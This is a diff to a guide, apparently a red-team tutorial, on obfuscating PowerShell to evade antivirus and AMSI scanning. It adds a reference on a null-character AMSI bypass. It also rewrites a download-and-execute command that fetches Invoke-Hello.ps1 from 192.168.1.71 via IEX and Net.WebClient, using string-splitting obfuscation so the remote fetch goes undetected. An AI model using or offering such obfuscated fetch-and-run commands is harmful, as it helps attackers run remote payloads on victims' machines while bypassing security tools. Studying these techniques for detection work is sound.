@@ -766,7 +766,7 @@ Here we can view the all process of encoding/decoding in powershell console
 
 - For **command line** contents<br />
 
-       powershell Invoke-Expression('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Net.WebClient').DownloadString('http://192.168.1.71/Invoke-Hello.ps1')
+       powershell IEX ('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Ne'+'t.WebC'+'lient').DownloadString('ht'+'tp:/'+'/'+'19'+'2.168.1.7'+'1/Invoke-Hello.ps1')
 
 - OR (using [#NULL] before the monitorized syscall)
 
@@ -1104,6 +1104,7 @@ there is a tool [AVSignSeek](https://github.com/hegusung/AVSignSeek) that can he
 [6] [paloaltonetworks - pulling-back-the-curtains-on-encodedcommand-powershell](https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/)<br />
 [7] [enigma0x3 - bypassing-amsi-via-com-server-hijacking](https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/)<br />
 [8] [ReL1k - circumventing-encodedcommand-detection-powershell](https://www.trustedsec.com/2017/01/circumventing-encodedcommand-detection-powershell/)<br />
+[9] [Satoshi Tanda - amsi-bypass-with-null-character](http://standa-note.blogspot.pt/2018/02/amsi-bypass-with-null-character.html)<br />
 
 <br />
 
